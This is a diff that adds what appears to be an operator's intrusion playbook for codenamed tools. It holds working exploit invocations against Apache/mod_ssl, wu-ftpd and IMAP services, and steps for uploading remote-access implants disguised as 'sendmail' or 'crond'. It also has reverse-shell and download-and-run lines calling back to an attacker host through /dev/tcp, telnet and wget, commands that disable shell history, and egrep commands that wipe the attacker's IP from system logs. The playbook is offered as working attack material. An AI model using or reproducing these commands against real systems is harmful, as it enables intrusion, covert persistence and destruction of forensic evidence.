@@ -1,0 +1,5712 @@
+# 2010-07-26 13:30:20 EDT 
+
+
+
+############- TOUCH
+#only from redirector  **SKIP**
+
+nslookup domain
+nslookup ip
+nslookup -query=mx domain_name
+nslookup -query=mx domain_name
+
+############- on solaris pingflag is -s
+ping  IP
+
+        TTL             OS
+        2 - 32          Windows for Workgroups
+        2 - 32          Windows 95
+
+        34 - 64         Red Hat Linux (< version 6.0)
+        34 - 64         Digital UNIX
+        34 - 64         SCO
+
+        98 - 128        Windows NT
+        98 - 128        Windows 95 w/MS Dialup Network Upgrade
+        98 - 128        Windows 98
+
+        225 - 255       UNIX
+        Note: recent Sun OS 5.9 boxes TTL 34-64.
+
+################### PITCHIMPAIR INSTRUCTIONS ######################################
+
+
+###
+### begin user.mission.pitchimpair
+###
+
+        ### get rid of pesky spaces at beginning of lines (fixes pasted html)
+:%s/^[ ]*//g
+:1
+
+
+        ### Set up variables.  Use the next section for reference.  
+
+	## Description		Typical Value		Actual Value This OP
+	## ---------------	-------------		--------------------
+	## local-ip:					LOCAL_IP
+	## pitch-ip:					PITCH_IP
+	## target-ip:					TARGET_IP
+        ## target-name:                	             	TARGET_NAME
+        ## target-domain:       	                TARGET_DOMAIN
+	## netcat-port:		random			NETCAT_PORT
+	## rat-port:		nopen port		RAT_PORT
+	## rat-name:		sendmail		RAT_NAME
+	## work-dir:		.scsi			WORK_DIR
+
+	# Make the changes here.  Use the above for reference if you need it.
+
+
+
+
+#######################################################################
+#
+#  Need a new userlist ?
+#
+#  -ls /global/m*/MB/*/*/*/mailinfo.dat > L:/current/down/userlist
+#
+#  (N.B. the -ls will give the mailinfo.dat file timestamps in the
+#        format expected by lsstamp ... see next command)
+#
+#  ## now, LOCALLY run lsstamp userlist > userlist.sorted
+#  ## (lsstamp will sort the -ls lines in date order)
+#
+# Collection: -get /global/m1/MB/96/8/karachi:moftec/mailinfo.dat
+#
+#
+#######################################################################
+
+
+mx
+:%s/LOCAL_IP/LOCALIP/g
+:%s/PITCH_IP/PITCH_IP/g
+:%s/TARGET_IP/TARGET_IP/g
+:%s/TARGET_NAME/TARGET_NAME/g
+:%s/TARGET_DOMAIN/TARGET_DOMAIN/g
+:%s/NETCAT_PORT/38745/g
+:%s/RAT_PORT/RAT_PORT/g
+:%s/RAT_NAME/sendmail/g
+:%s/WORK_DIR/.scsi/g
+:%s/mm-dd-yyyy/mm-dd-yyyy/g
+`x
+
+### Use this if we already own the target:
+### Create /current/etc/hops.txt file
+HOP1: PITCH_IP:R -lue
+HOP2: TARGET_IP:R -uec
+
+
+
+##################################################################
+## Using NOPEN to start something with clean file descriptors
+## using -shell then exec to close file descriptors.
+##
+## Two examples, one for noserver, one for other standalones.
+##################################################################
+
+
+# This can be useful after exploits, too--if our NOPEN inherits a
+# legit port from the exploit (say 161), then we install, we have just
+# hidden our target's snmpd. Not good.
+
+-shell
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+exec 3<&- 4<&- 5<&- 6<&- 7<&- 8<&- 9<&-
+# We want only 0 1 and 2 left, ideally
+ls -al /proc/$$/fd
+# Try cleaning any over 9, but you often lose your -shell when you do so.
+# Look for a window you have with just fd's under 10.
+cp /proc/$$/exe sendmail || cp /proc/$$/object/a.out sendmail
+PATH=. D=-ulrandom14444-55555 sendmail
+# OR: PATH=. D=-ucREDIR_IP:random14444-55555 sendmail
+netstat -antp | grep sendmail || netstat -an | grep sendmail
+ps -ef | grep sendmail$
+rm sendmail
+exit
+
+# Used when deploying standalones (DD, SBZ), it helps avoid their
+# children having the NOPEN ports inherited in CLOSE_WAIT state.
+
+-put /current/up/STANDALONETODEPLOY  ./RAN_AS
+-addpath .
+-shell
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+exec 3<&- 4<&- 5<&- 6<&- 7<&- 8<&- 9<&-
+# We want only 0 1 and 2 left, ideally
+ls -al /proc/$$/fd
+# Try cleaning any over 9, but you often lose your -shell when you do so.
+# Look for a window you have with just fd's under 10.
+which RAN_AS
+RAN_AS FAKE_ARGS_IF_ANY &
+echo $?
+rm RAN_AS
+exit
+
+
+
+
+
+############ Set up nopen for  access
+###
+
+### start upload in another window
+cd /current/up
+
+file noserver*
+cp noserver.[sparc] noserver
+
+### using NOPEN
+file noserver*
+packrat NETCAT_PORT
+        # cp noserver sendmail; compress -c sendmail | uuencode sendmail.Z > sendmail.uu
+        # ls -l sendmail.uu*
+        # nc -l -p NETCAT_PORT < sendmail.uu
+
+
+
+
+### Filters out "last" command on initial ops on the target
+echo "last" > /current/etc/autofilter.TARGET_NAME.TARGET_IP
+	# or
+echo "last" > /current/etc/autofilter.TARGET_NAME.TARGET_DOMAIN.TARGET_IP
+
+
+
+
+        ### in setting up windows, you probably want this
+
+        ### td is an alias on HURRICANE and TYPHOON to set up a TCPDUMP xterm on right screen
+
+	td
+
+	cd /current/down
+	script -a windows.tcpdump
+
+	tcpdump -i eth0 -n -n 
+
+        ### in addition to this (which scrubhands may have given you)
+
+	td
+
+	cd /current/down
+	script -a tcpdump.raw
+
+	tcpdump -i ppp0 -n -n
+
+
+### Use something similar to this for annoying packets in the red tcpdump:
+### Paste in a non-scripted window:
+echo "pathcost" >> /tmp/filters.inuse && mv /tmp/filters.inuse /tmp/filters
+echo "NetBeui" >> /tmp/filters.inuse && mv /tmp/filters.inuse /tmp/filters
+echo "who-has" >> /tmp/filters.inuse && mv /tmp/filters.inuse /tmp/filters
+echo "router" >> /tmp/filters.inuse && mv /tmp/filters.inuse /tmp/filters
+
+
+
+
+        ### if done via PITCHIMPAIR infrastructure:
+        ###
+        ### Get onto INCISION host: 
+        ### 
+# if using hops.txt:
+ourtn
+
+# if using commandline:
+ourtn -uel PITCH_IP
+
+	# or
+	ourtn -ue PITCH_IP TARGET_IP
+	ourtn -eulc -o RAT_PORT PITCH_IP TARGET_IP
+
+	DISPLAY=
+	export DISPLAY
+
+	./ftshell ./tn.spayed PITCH_IP
+	### or
+	./ftshell ourtn PITCH_IP
+
+        ### Check for our PID (shouldn't see it)
+	ps -ef|grep <PID>
+
+
+	### See who's on
+	w ; date
+
+        ### Check for anything mucking with /tmp
+	ps -ef | grep \/tmp
+
+	df -k
+
+	dmesg
+
+        ### Create working directory - first make sure /tmp doesn't have it already
+
+	ls -al /tmp 
+	cd /tmp; ls -al
+	pwd
+
+        ### check things out a bit...
+
+        ls -lart /etc | tail -30 ; uname -a ; date ; ifconfig -a ; w
+
+
+        ### maybe check logs?
+
+        ls -lart /var/adm /var/log
+
+
+        ### look for sniffers etc
+        ps -ef|grep ####
+
+
+        ### upload RAT
+
+	~~p
+	../up/noserver.sparc sendmail
+
+	ls -al
+	chmod 700 sendmail && netstat -an | grep RAT_PORT 
+	PATH=. D=-lRAT_PORT sendmail && rm sendmail && ls -alrt
+
+
+### in a local window, connect to pitchimpair via nopen, and start tunnels ####
+
+### Ex: noclient 217.53.1.2:39222
+
+cd /current/down
+noclient PITCH_IP:RAT_PORT
+
+        #-readrc ../etc/norc.solaris
+
+
+########################################
+# INCISION to FreeBSD implant
+########################################
+
+# from local LINUX scripted window
+export EXPECT_PROMPT="(%|:|#|\\$)[ ]*$"
+ourtn -lue PITCH_IP
+-irtun 219.238.199.144 RANDOM_PORT -z -s 80
+setenv D -lNOPEN_PORT                   # NO = sign and use setenv
+set path = (. /usr/bin /bin)            # NO QUOTES and use set
+~~p
+/current/up/noserver cron               # freebsd noserver
+which cron
+cron
+
+# from NOPEN on the PITCHIMPAIR host:
+-nstun 219.238.199.144:NOPEN_PORT   
+-cd /tmp
+-lt
+-rm cron
+-lt
+
+-------------------------------------
+export EXPECT_PROMPT="(%|:|#|\\$)[ ]*$"
+ourtn -lz TARGET_IP     # or -irtun TARGET_IP PORT -lz
+
+setenv D -lNOPEN_PORT                   # NO = sign and use setenv
+set path = (. /usr/bin /bin)            # NO QUOTES and use set
+~~p
+/current/up/noserver crond              # freebsd noserver
+which crond
+crond
+
+noclient TARGET_IP:NOPEN_PORT   or -nstun TARGET_IP NOPEN_PORT
+
+
+########################################
+# JACKLADDER
+########################################
+
+### can be done without a redirector and will upload and execute nopen
+
+jacktelnet.sh TARGET_IP LOCAL_IP NETCAT_PORT WORK_DIR RAT_NAME [JACKPORT]
+
+
+########################################
+# JACKLADDER - triggering IN thru JACKPOP on Linux (FAINTSPIRIT)
+########################################
+
+### Local window, let this sit and wait:
+ourtn -T 202.38.128.1 -n -I -ue -O 113 -p 443 -C 211.40.103.194 127.0.0.1
+
+### on PITCH: set up window for nopen callback
+-nrtun 113
+
+### on PITCH: set up tunnel for nopen upload
+-tunnel
+r NOPEN_UPLOAD_PORT
+
+### on PITCH, run jackpop to tickle incision 
+-jackpop 202.38.128.1 110 211.40.103.194 13732
+#3 run a command
+/dev/ttyia2 PITCH_IP 443
+yes ### let incision bless the commands
+
+### incision will talk to your local window, then callback to your -nrtun window
+
+
+###################################################
+### REDIRECTING IN THRU WINDOWS
+###################################################
+
+##################  SENDING TRIGGER THRU WINDOWS (2000 or XP) BOX ##########################
+#####  NT4.0 doesn't allow the use of raw sockets, which is needed to send the IN trigger ##
+
+mx
+:%s/LOCAL_WINDOWS_IP/LOCAL_WINDOWS_IP/g
+:%s/LOCAL_UNIX_IP/LOCAL_UNIX_IP/g
+:%s/UNIX_INCISION_TRIGGER_PORT/UNIX_INCISION_TRIGGER_PORT/g
+:%s/INCISION_CALLBACK_PORT/INCISION_CALLBACK_PORT/g
+:%s/NOPEN_CALLBACK_PORT/NOPEN_CALLBACK_PORT/g
+
+:%s/WIN_TARG_INTERNAL_IP/10.140.0.9/g
+:%s/TARGET_IP/10.140.0.40/g
+
+`x
+
+## Usage: script unixredirect.eps LOCAL-WINDOWS-IP LOCAL-UNIX-IP UNIX-INCISION-TRIGGER-PORT INCISION-CALLBACK-PORT NOPEN-CALLBACK-PORT
+
+script unixredirect.eps LOCAL_WINDOWS_IP LOCAL_UNIX_IP UNIX_INCISION_TRIGGER_PORT INCISION_CALLBACK_PORT NOPEN_CALLBACK_PORT
+
+        ### or run the following by hand
+
+
+        ### On Windows box #####################
+
+        # Note: can use 'background' instead of 'monitor' in the windows commands
+
+        # This sends the trigger:
+        # monitor packetredirect -packettype tcp -listenport LOCAL-PORT -bind LOCAL-WIN-IP
+        # Ex. - monitor packetredirect -packettype tcp -listenport 32654 -bind DOOBIEIP
+
+        monitor packetredirect -packettype tcp -listenport LOCAL_PORT -bind LOCAL_WIN_IP
+
+
+
+        # This listens for the ish callback
+        # monitor redirect -tcp -implantlisten ISH-CALLBACK-PORT -target LOCAL-LINUX-IP ISH-CALLBACK-PORT
+        # Ex. - monitor redirect -tcp -implantlisten 28345 -target FIREBALL_IP 28345
+
+        monitor redirect -tcp -implantlisten ISH_CALLBACK_PORT -target LOCAL_LINUX_IP ISH_CALLBACK_PORT
+
+
+
+        # For nopen connection: 
+        # monitor redirect -tcp -lplisten RAT-PORT
+        # Ex. - monitor redirect -tcp -lplisten 47108
+
+        monitor redirect -tcp -lplisten RAT_PORT -target TARGET_IP RAT_PORT -bind LOCAL_WIN_IP
+
+
+
+        # For additional nopen connections, increment the lplisten port, but keep the same target nopen port:
+        # monitor redirect -tcp -lplisten RAT-PORT+1 -target TARGET-IP RAT-PORT -bind LOCAL-WIN-IP
+        # Ex. - monitor redirect -tcp -lplisten 47109 -target 10.1.1.3 47108 -bind 10.1.1.2
+        # Ex. - monitor redirect -tcp -lplisten 47110 -target 10.1.1.3 47108 -bind 10.1.1.2
+
+        monitor redirect -tcp -lplisten RAT_PORT+1 -target TARGET_IP RAT_PORT -bind LOCAL_WIN_IP
+
+        ### On Linux box: #####################
+
+
+        # Once the first three windows commands are set up, you can send the trigger:
+        # ourtn -W LOCAL-WIN-IP:LOCAL-PORT -o RAT-PORT -p ISH-CALLBACK-PORT -i WIN-TARG-IP -ue TARGET-IP
+        # Ex: ourtn  -W DOOBIE_IP:32654 -o 47108 -p 28345 -i 10.1.1.4 -ue 10.1.1.3
+
+        #ourtn -W LOCAL_WIN_IP:LOCAL_PORT -o RAT_PORT -p ISH_CALLBACK_PORT -i WIN_TARG_IP -ue TARGET_IP
+        #ourtn -W 192.168.254.253:31413 -O 41611 -C 202.154.225.27 -p 37541 -i 202.154.225.27 -ue 10.140.0.40
+
+        #ourtn -ueW 192.168.254.253:31413 -i 202.154.225.27 -C 202.154.225.27 -p 37541 -O 41611 10.140.0.40
+        TRAVOLTA=1 ourtn -ueW 192.168.254.22:8942 -i 10.140.0.9 -C 10.140.0.9 -p 18855 -O 7549 10.140.0.40
+
+### Use the TRAVOLTA option to keep nopen from dying in 5 hours, only if you think the op will be extended
+### If alien has issues with an nfs mount point, so use the "-Q" option to ourtn and DO NOT run the following
+###     -lt /, df -k, otherwise, you'll tie up your window and will need to kill the process;
+###     it's better NOT to run nopen built-ins on alien so that you can kill something if it hangs
+
+incision trigger = UNIX_INCISION_TRIGGER_PORT
+incision callback = INCISION_CALLBACK_PORT
+nopen callback = NOPEN_CALLBACK_PORT
+
+
+#ourtn -ueW 192.168.254.142:36541 -i 10.140.0.9 -C 10.140.0.9 -p 34789 -O 45665 10.140.0.40
+#ourtn -ueW LOCAL-WIN-IP:LOCAL-PORT -i WIN-TARG-IP -C WIN-TARG-INTERNAL-IP -p ISH-CALLBACK-PORT -O RAT-PORT TARGET-IP
+ourtn -ueW LOCAL_WINDOWS_IP:UNIX_INCISION_TRIGGER_PORT -i WIN_TARG_INTERNAL_IP -C WIN_TARG_INTERNAL_IP -p INCISION_CALLBACK_PORT -O NOPEN_CALLBACK_PORT TARGET_IP
+
+noclient -l NOPEN_CALLBACK_PORT
+#noclient -l 45665
+
+
+        #  Call forward to nopen works to alien, start a -listen PORT to call forward
+        #  Set up redirectors on windows side to allow the following connections:
+
+mx
+:%s/NOPEN_CALLFORWARD_PORT/NOPEN_CALLFORWARD_PORT/g
+'x
+
+
+# on windows side:
+background redirect -tcp -lplisten NOPEN_CALLFORWARD_PORT -target TARGET_IP NOPEN_CALLFORWARD_PORT -bind LOCAL_WINDOWS_IP
+background redirect -tcp -lplisten NOPEN_CALLFORWARD_PORT+1 -target TARGET_IP NOPEN_CALLFORWARD_PORT -bind LOCAL_WINDOWS_IP
+background redirect -tcp -lplisten NOPEN_CALLFORWARD_PORT+2 -target TARGET_IP NOPEN_CALLFORWARD_PORT -bind LOCAL_WINDOWS_IP
+
+
+-listen NOPEN_CALLFORWARD_PORT
+noclient LOCAL_WINDOWS_IP:NOPEN_CALLFORWARD_PORT
+#noclient LOCAL_WINDOWS_IP:NOPEN_CALLFORWARD_PORT+1
+#noclient LOCAL_WINDOWS_IP:NOPEN_CALLFORWARD_PORT+2
+
+
+
+        #### To kill one server first use it to start a new one (new one won't burn)
+        D=-l23477 PATH=. sendmail
+        -burnBURN
+
+
+        # Connect to nopen; suggest using the port override option (-o) above for simplicity
+        # For additional windows, you and the windows person must increment the redirected port
+        # Ex. - noclient 10.1.1.2:47108
+        # Ex. - noclient 10.1.1.2:47109
+
+        #noclient 10.1.1.2:RAT_PORT+1
+
+
+
+###########################################################
+# YES - for HPUX
+###########################################################
+
+./yes 127.0.0.1 100083 1 PROGRAM_PORT 0x40062ea8 'mkdir /tmp/.scsi;cd /tmp/.scsi && /usr/bin/telnet PITCH_IP NETCAT_PORT </dev/console |uudecode 2>&1 > /dev/null 2>&1 && uncompress -f sendmail.Z;chmod 0700 sendmail && export D=-cPITCH_IP:NOPEN_PORT && ./sendmail' 
+
+
+
+
+###########################################################
+# CUP
+###########################################################
+
+-gs wearcup -h
+
+### to have it cleanup in 3 hours:
+-gs wearcup -r <remote_name> -w 3h
+
+### to have it cleanup in 2 minutes:
+-gs wearcup -r <remote_name> -w 120s
+
+### or, run it by hand:
+### locally, edit cup, and change the working dir, and time in minutes to wait for execution
+
+
+### upload cup
+-put /current/up/cup.DEPRECATED.SEE.README.cup.NOPEN cup
+-cat cup
+
+### run cup
+./cup &
+ps -ef |grep sleep
+
+### You can kill the sleep to make it execute immediately, or just let 
+###    it run normally
+
+-exit
+
+####	DO NOT -burn !!!!!!!!!  USE -exit INSTEAD!!!!!!!!!!
+
+###########################################################
+# HP Kernel Checks
+###########################################################
+
+# run these to check target for kernel info for implants:
+
+/usr/bin/getconf SC_CPU_VERSION
+/usr/bin/getconf SC_KERNEL_BITS
+kmadmin -s
+
+
+
+#########################################################
+# EVENLESSON
+#########################################################
+
+# runs against Linux systems running Apache with mod_ssl accessing 
+# OpenSSL 0.9.6d or earlier on x86 architectures
+# May not work first time; Try increasing the number of connections to the target by 6.
+# If this fails, try increasing the number of connections by 4 until you reach 40.
+# SHould give you prompt on system - may have to elevate
+
+#-scan 443 TARGET_IP
+-scan http TARGET_IP
+-scan ssl TARGET_IP
+
+### Redirector:
+
+-tunnel
+l 443 TARGET_IP
+r NETCAT_PORT
+
+
+### query target:
+
+./apache-ssl-linux_v3 -i 127.0.0.1
+./apache-ssl-linux -i  -s
+
+
+### Usage:
+# Usage: ./apache-ssl-linux <-i hostname> [-s scan banner] [-t arch] [-p port] [-n <conne
+ctions>] [-a 0x<address>]
+
+
+
+### Usage for default values:
+./apache-ssl-linux -i TARGET_IP -t ARCH
+
+
+### Usage for increasing number of connections to increase chances
+./apache-ssl-linux -i TARGET_IP -t ARCH -n 20
+
+
+#### get ptrace, forkpty, and nopen tarball ready to send:
+cd /current/up
+cp ptrace<TAB> pt
+cp noserver sendmail
+cp forkpty fp
+tar cvf 1u.tar pt sendmail fp
+uuencode 1u.tar 1u.tar > 1u.tar.uu
+
+nc -l -p NETCAT_PORT < 1u.tar.uu
+
+#### to elevate and also get nopen there:
+cd /tmp
+mkdir .scsi
+cd .scsi
+telnet LOCAL_IP NETCAT_PORT > src
+      Connection closed by foreign host.
+ls -la
+uudecode src
+ls -la
+tar xvf 1u.tar
+ls -la
+chmod 700 fp sendmail pt
+./fp
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+
+#### at sh-prompt, type:
+tty
+./pt
+id
+PATH=. sendmail
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+
+
+##### Cleanup
+
+/var/log/httpd/error_log
+
+
+
+
+
+
+###########################################################
+# EYEMASK
+###########################################################
+
+### Imap masqerade
+### Bring a local to get root
+
+### for solaris
+
+nc -v -l -p 53 < ../up/noserver-sparc-sun-solaris2.5.1 
+noclient  -l 25
+telnet TARGET_IP 143
+
+A000 LOGIN user password
+A001 EXAMINE /etc/mail/sendmail.cf
+A002 FETCH 1 RFC822
+A003 EXAMINE /etc/passwd
+A004 FETCH 1 RFC822
+A003 EXAMINE /etc/shells
+A004 FETCH 1 RFC822
+A005 EXAMINE .forward
+A006 CREATE .forward
+A007 CREATE .forward
+A008 APPEND .forward (\Seen) {145}
+"| /bin/ksh -c '/bin/cat</dev/tcp/PITCH_IP/53>/tmp/sendmail;chmod +x /tmp/sendmail;D=-cPITCH_IP:25 PATH=/tmp sendmail;rm -f /tmp/sendmail'"
+
+A009 DELETE .forward
+A010 LOGOUT
+
+telnet PITCH_IP 25
+HELO helo
+MAIL FROM: user@itt.beta.net
+RCPT TO: user@itt.beta.net
+DATA
+.
+QUIT
+
+# echo -e "HTTP/1.0 200\n" > new
+# cat new noserver-2.6.1-i586.pc.linux.gnu.redhat-5.0 > sendmail
+# nc -v -l -p 53 < sendmail
+
+# noclient -l 25
+
+
+
+
+
+
+telnet TARGET_IP 143
+A000 LOGIN user password
+A001 EXAMINE /etc/mail/sendmail.cf
+A002 FETCH 1 RFC822
+A003 EXAMINE /etc/passwd
+A004 FETCH 1 RFC822
+A003 EXAMINE /etc/shells
+A004 FETCH 1 RFC822
+A100 LIST /etc/smrsh *
+A005 EXAMINE .forward
+A006 CREATE .forward
+A007 CREATE .forward
+A008 APPEND .forward (\Seen) {11}
+"| slocal"
+A100 CREATE .maildelivery
+A101 APPEND .maildelivery (\Seen) {37}
+To user pipe A >/home/user/.g
+A102 LIST "" %
+A102 RENAME .g .procmailrc
+A008 APPEND .procmailrc (\Seen) {128}
+:0 c
+|cd /tmp;wget http://PITCH_IP:53/sendmail; chmod +x /tmp/sendmail;D=-cPITCH_IP:25 PATH=/tmp sendmail;rm -f sendmail
+A009 DELETE .forward
+A009 DELETE .maildelivery
+A009 DELETE .procmailrc
+A010 LOGOUT
+
+telnet localhost 25
+HELO helo
+MAIL FROM: user@localhost.localdomain
+RCPT TO: user@localhost.localdomain
+DATA
+.
+QUIT
+
+
+
+telnet fawn 143
+A000 LOGIN user password
+A001 EXAMINE /etc/mail/sendmail.cf
+A002 FETCH 1 RFC822
+A003 EXAMINE /etc/passwd
+A004 FETCH 1 RFC822
+A003 EXAMINE /etc/shells
+A004 FETCH 1 RFC822
+A102 LIST "/usr/bin/X11" %
+A005 EXAMINE .forward
+A006 CREATE .forward
+A007 CREATE .forward
+A008 APPEND .forward (\Seen) {50}
+"| /usr/bin/*11/xterm -display PITCH_IP:26000"
+A009 DELETE .forward
+A010 LOGOUT
+
+telnet fawn 25
+HELO helo
+MAIL FROM: user@fawn.beta.net
+RCPT TO: user@fawn.beta.net
+DATA
+.
+QUIT
+
+
+
+### cleanup
+possible logging in /var/adm/messages (should blend in if it fails)
+
+
+###########################################################
+# EXPOUNDATOM
+###########################################################
+# Requires the target to have the wu-2.6.1 FTP service running
+# Requires anonymous ftp access (determined if exploit works)
+# -scan ftp TARGET_IP
+# A maximum of two tries can be attempted.
+#
+# Syntax
+# ./wu-261-linux -h
+# For target list:
+# ./wu-261-linux -t0 -h
+
+
+# No redirection:
+./wu-261-linux TARGET_IP 21 VERSION
+
+
+
+# w/ redirection:
+-tunnel
+l 21 TARGET_IP 
+
+# Locally:
+./wu-261-linux -a -d 127.0.0.1
+./wu-261-linux -t17 -d 127.0.0.1
+
+# SHould give you root; need to upload nopen
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+cd /tmp
+mkdir WORK_DIR
+cd /tmp/WORK_DIR
+pwd 
+which uudecode uncompress
+        # gedit sendmail
+uudecode; ls -latr
+uncompress sendmail.Z
+ls -la
+chmod 700 sendmail
+PATH=. sendmail
+
+# IF it complains about the user/pass correct, then it's not vulnerable to
+# our pair that we try to send it; 
+
+# Cleanup:
+# /var/log/messages (look for ftp access)
+# /var/adm/utmpx, wtmpx
+# /var/log/secure
+
+
+###################################################
+### EMBERSNOUT
+###################################################
+
+# must verify that box is RH9.0(SHRIKE) and that 
+# httpd is "Apache/2.0.40 (Red Hat Linux)
+
+-scan telnet TARGET_IP
+-scan ssh TARGET_IP
+-scan ssl TARGET_IP
+
+# Notes:
+# this indicates it's RH9.0 but could be either Psyche or Shrike:
+#       (Linux release 2.4.20-8custom #3 SMP Thu Aug 28 13:56:20 EDT 2003)
+
+# seeing this indicates (Shrike) because the version is bundled with it:
+#       SH-1.99-OpenSSH_3.5p1
+
+# this version of Apache is needed but Psyche comes with 2.0.40-8 and
+#       Shrike comes with 2.0.40-21; the release in not determinable from
+#       a scan; just verify it's what is expected:
+#       Server: Apache/2.0.40 (Red Hat Linux)
+# 
+
+# op box should work - depends if python is included
+rpm -qf /usr/bin/python
+        # should see:  python-base-2.2-9mdk
+
+# if you want it to pop an xterm back to your screen:
+#       - make sure 6000 is listening
+#       - run xhost +
+
+./es.py
+   Arguments:  ['./es.py']
+
+
+   Usage -> ./es.py ip port packet_size start_ebp end_ebp ebp_inc hex_pad_byte "cmd"
+
+   where...
+
+         ip............target IP address
+         port..........target httpd TCP port number (usually 443)
+         packet_size...attack packet length in bytes
+         start_ebp.....guessed %ebp value to start with
+         end_ebp.......guessed %ebp value to end with
+         ebp_inc.......how many stack bytes to bump %ebp each time
+         hex_pad_byte..packet filling byte (0x0 will do randomized fill)
+         "cmd".........ASCII command string to be executed on target
+
+### Locally
+netstat -an |grep 6000
+xhost +
+
+
+########### REDIRECTED:
+
+
+### Redirector:
+-tunnel
+l 443 TARGET_IP
+r 6006 127.0.0.1 6000 
+r NETCAT_PORT
+
+### In a local scripted window, set up a netcat to listen for a connection:
+
+nc -vv -l -p NETCAT_PORT
+
+
+### Locally (choose a method):
+
+### This one will send command results back to a netcat window (not interactive)
+./es.py 127.0.0.1 443 5000 0xbfffe000 0xbffffff0 0x4 0x0 (/bin/uname -a; /usr/bin/id; /bin/ps -auxww; /bin/w)|/usr/
+bin/telnet PITCH_IP NETCAT_PORT"
+
+### This one gives you an interactive window:
+./es.py 127.0.0.1 443 5000 0xbfffe000 0xbffffff0 0x4 0x0 "(sh</dev/tcp/PITCH_IP/NETCAT_PORT>&0 2>&0)"
+        # or for ksh:
+./es.py 127.0.0.1 443 5000 0xbfffe000 0xbffffff0 0x4 0x0 "(ksh -c "sh </dev/tcp/PITCH_IP/NETCAT_PORT >&0 2>&0")"
+
+### This one pops back an xterm (be patient for it to pop back and keep mouse clear of window):
+./es.py 127.0.0.1 443 5000 0xbfffe000 0xbffffff0 0x4 0x0 "/usr/bin/X11/xterm -display PITCH_IP:6 -e /bin/sh"
+
+
+############  No Redirection:
+
+./es.py TARGET_IP 443 5000 0xbfffe000 0xbffffff0 0x4 0x0 (/bin/uname -a; /usr/bin/id; /bin/ps -auxww; /bin/w)|/usr/
+bin/telnet LOCALIP NETCAT_PORT"
+
+./es.py TARGET_IP 443 5000 HIT_STRING 0xbffffff0 0x4 0x0 "(/usr/bin/X11/xterm -display LOCALIP:0 -e /bin/sh)"
+
+./es.py 127.0.0.1 443 5000 0xbfffe000 0xbffffff0 0x4 0x0 "(sh</dev/tcp/LOCAL_IP/NETCAT_PORT>&0 2>&0)"
+
+
+
+### if the exploit stalls after a bit, hit Ctl-C to wake it up, which
+### prompts you if you want to continue - hit 'y'
+### watch for a connection back to your netcat window
+
+### Once you have access........
+### you need to first clean extraneous processes started by httpd
+### run this to help clean:
+
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+pwd
+exec 3<&- 4<&- 5<&- 6<&- 7<&- 8<&- 9<&- 10<&- 11<&- 12<&- 13<&- 255<&-
+/usr/sbin/lsof |grep ^sh
+uname -a; id
+mkdir -p /tmp/.httpd-lock; chmod 700 /tmp/.httpd-lock; ls -lctra /tmp
+cd /tmp/.httpd-lock; pwd
+which uudecode uncompress
+#telnet PITCH_IP NETCAT_PORT </dev/tty | uudecode ; ls -la
+#uncompress crond.Z; chmod 700 crond; ls -la
+
+# if no uudecode, use this
+### locally:
+# nc -l -vv -p NETCAT_PORT < crond
+
+
+### back on target window:
+#/bin/cat</dev/tcp/PITCH_IP/NETCAT_PORT>/tmp/.httpd-lock/crond
+chmod 700 crond
+PATH=. crond
+PATH=. D=-cPITCHIP:NOPEN_PORT crond
+rm crond
+
+
+-nstun TARGET_IP
+-nrtun NOPEN_PORT
+noclient TARGET_IP
+
+### need to elevate so you can clean logs (use eventstart - ptrace won't work on RH9)
+
+
+
+### Logging:
+-lt /var/log/httpd
+        /var/log/httpd/ssl_access_log
+        /var/log/httpd/ssl_request_log
+        /var/log/httpd/ssl_error_log
+        /var/log/httpd/error_log
+
+-lt /var/log
+        /var/log/messages
+        /var/log/secure
+        /var/log/maillog
+
+egrep -v PITCH_IP /var/log/httpd/ssl_access_log > t; cat t > /var/log/httpd/ssl_access_log
+egrep -v PITCH_IP /var/log/httpd/ssl_request_log > t; cat t > /var/log/httpd/ssl_request_log
+egrep -v PITCH_IP /var/log/httpd/error_log > t; cat t > /var/log/httpd/error_log
+egrep -v Segmentation /var/log/httpd/error_log > t; cat t > /var/log/httpd/error_log
+egrep -v PITCH_IP /var/log/httpd/ssl_error_log > t; cat t > /var/log/httpd/ssl_error_log
+egrep -v PITCH_IP /var/log/messages > t; cat t > /var/log/messages
+egrep -v PITCH_IP /var/log/secure > t; cat t > /var/log/secure
+egrep -v PITCH_IP /var/log/maillog > t; cat t > /var/log/maillog
+
+
+####################################
+### ENVELOPSWALLOW
+####################################
+
+# buffer overflow for Apache Web
+
+
+Usage: ./envelopswallow <-switches> -h host[:80]
+  -h host[:port]        Host to penetratea and TCP port of the web server to attack
+  -t #                  Target id.
+  Bruteforcing options (all required, unless -o is used!):
+  -o char               Default values for the following OSes
+                        (f)reebsd, (o)penbsd, (n)etbsd
+  -b 0x12345678         Base address used for bruteforce
+                        Try 0x80000/obsd, 0x80a0000/fbsd, 0x080e0000/nbsd.
+  -d -nnn               memcpy() delta between s1 and addr to overwrite
+                        Try -146/obsd, -150/fbsd, -90/nbsd.
+  -z #                  Numbers of time to repeat \0 in the buffer
+                        Try 36 for openbsd/freebsd and 42 for netbsd
+  -r #                  Number of times to repeat retadd in the buffer
+                        Try 6 for openbsd/freebsd and 5 for netbsd
+  Optional stuff: 
+  -w #                  Maximum number of seconds to wait for shellcode reply
+  -c cmdz               Commands to execute when our shellcode replies
+                        aka auto0wncmdz
+  -W # of seconds to wait between tries (use this when tunneling thru nopen)
+
+
+
+
+-scan http TARGET_IP
+
+-tunnel
+l RANDOM TARGET_IP 80
+r NETCAT_PORT
+
+
+./envelopswallow
+
+# plug in the options of the matching line
+# change TARGET_IP to 127.0.0.1 if using redirection
+
+#	4.0 FreeBSD RELEASE apache-1.3.12(distro binary) apache+mod_ssl-1.3.12+2.6.2(distro binary)
+#      apache+php-1.3.12+3.0.15 (distro binary) apache+php-1.3.12+4.0b3 (distro binary)
+#      apache+ssl-1.3.9+1.37(distro binary)
+      ./envelopswallow -o f -w 1000 -b 0xbfbfd000 -d -134 -r 11 -z 16 -h TARGET_IP:80
+
+#      4.1 FreeBSD Apache 1.3.12(distro binary)
+      ./envelopswallow -o f -w 1000 -b 0xbfbfd000 -d -134 -r 11 -z 16 -h TARGET_IP:80
+      ./envelopswallow -o f -w 1000 -b 0xbfbf0000 -d -134 -r 11 -z 16 -h TARGET_:80
+
+
